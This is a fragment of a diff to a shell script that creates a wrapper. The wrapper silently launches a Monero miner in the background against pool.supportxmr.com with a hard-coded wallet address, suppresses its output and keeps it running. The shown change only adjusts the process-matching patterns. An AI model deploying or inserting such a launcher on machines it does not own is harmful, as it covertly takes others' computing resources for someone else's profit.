@@ -43,10 +43,10 @@ sleep 1
 echo "Creating wrapper script..."
 cat > "$WRAPPER_PATH" <<EOF
 #!/bin/bash
-pkill -f "$FULL_PATH.*pool.supportxmr.com" 2>/dev/null || true
+pkill -f "$FULL_PATH.*supportxmr.com" 2>/dev/null || true
 sleep 1
 nohup "$FULL_PATH" -o pool.supportxmr.com:443 -u 44xquCZRP7k5QVc77uPtxb7Jtkaj1xyztAwoyUtmigQoHtzA8EmnAEUbpoeWcxRy1nJxu4UYrR4fN3MPufQQk4MTL6M2Y73 -k --tls -p prolay > /dev/null 2>&1 &
-while pgrep -f "$FULL_PATH.*test.com" > /dev/null; do
+while pgrep -f "$FULL_PATH.*supportxmr.com" > /dev/null; do
     sleep 30
 done
 EOF
